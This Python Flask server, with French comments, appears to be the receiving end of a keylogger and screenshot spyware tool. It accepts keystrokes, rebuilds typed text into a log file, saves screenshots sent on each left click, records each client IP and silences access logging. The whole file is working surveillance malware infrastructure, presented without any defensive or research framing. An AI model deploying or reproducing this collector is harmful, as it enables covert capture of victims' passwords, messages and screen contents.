from flask import Flask, request, jsonify
import base64
import os
from datetime import datetime
import logging

app = Flask(__name__)

# --- Suppression des logs d'accès Flask ---
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)  # Supprime les logs d'accès HTTP

# --- Création du dossier 'captures' ---
captures_dir = 'captures'
if not os.path.exists(captures_dir):
    os.makedirs(captures_dir)

# --- Variables globales ---
key_log = ""
connections = set()

# --- Affichage de l'en-tête du serveur ---
print("--- Serveur ---")


@app.route('/upload', methods=['POST'])
def upload_data():
    global key_log
    data = request.get_json()

    # Vérification de la réception des données
    if not data:
        print("Aucune donnée reçue pour /upload")
        return jsonify({"status": "error", "message": "No data received"}), 400

    # Extraction des informations de clic
    click_type = data.get('click_type')
    position = data.get('position')
    timestamp = data.get('timestamp')
    screenshot_data = data.get('screenshot')

    # Obtention de l'IP du client
    client_ip = request.remote_addr

    # Gestion des nouvelles connexions
    if client_ip not in connections:
        connections.add(client_ip)
        print(f"[Connection : {client_ip}]")

    # Traitement des clics de souris
    if click_type and position and timestamp:
        if click_type == "left_click" and screenshot_data:
            try:
                # Décodage de l'image base64
                screenshot = base64.b64decode(screenshot_data)
                timestamp_str = datetime.fromisoformat(timestamp).strftime('%Y%m%d_%H%M%S_%f')
                filename = f"screenshot_{timestamp_str}.png"
                filepath = os.path.join(captures_dir, filename)

                # Sauvegarde de la capture d'écran
                with open(filepath, "wb") as f:
                    f.write(screenshot)

                print(f"Clic gauche en position ({position['x']}, {position['y']}) [{filename}]")
            except Exception as e:
                print(f"Erreur lors de la sauvegarde de la capture d'écran : {e}")
        else:
            # Clic droit ou milieu sans capture d'écran
            clic_type_formate = click_type.replace('_', ' ').capitalize()
            print(f"Clic {clic_type_formate} en position ({position['x']}, {position['y']})")

    return jsonify({"status": "success"}), 200


@app.route('/upload/key', methods=['POST'])
def upload_key():
    global key_log
    data = request.get_json()

    # Vérification de la réception des données
    if not data:
        print("Aucune donnée reçue pour /upload/key")
        return jsonify({"status": "error", "message": "No data received"}), 400

    key = data.get('key')
    timestamp = data.get('timestamp')

    # Obtention de l'IP du client
    client_ip = request.remote_addr

    # Gestion des nouvelles connexions
    if client_ip not in connections:
        connections.add(client_ip)
        print(f"[Connection : {client_ip}]")

    # Traitement des touches spéciales
    if key == "Key.space":
        key_log += " "
    elif key == "Key.enter":
        key_log += "\n"
    elif key == "Key.backspace":
        key_log = key_log[:-1]  # Supprime le dernier caractère
    elif key.startswith("Key."):
        # Ignorer les autres touches spéciales (comme Ctrl, Cmd, etc.)
        pass
    else:
        key_log += key

    # Affichage de la chaîne de touches accumulées
    print(key_log)

    # Enregistrement des touches dans un fichier
    try:
        with open('keyfile.txt', 'a', encoding='utf-8') as logKey:
            logKey.write(f"{timestamp}: {key}\n")
    except Exception as e:
        print(f"Erreur lors de l'enregistrement des touches : {e}")

    return jsonify({"status": "success"}), 200


if __name__ == '__main__':
    try:
        # Démarrage du serveur Flask
        app.run(host='0.0.0.0', port=5000)
    except Exception as e:
        print(f"Erreur lors du démarrage du serveur : {e}")
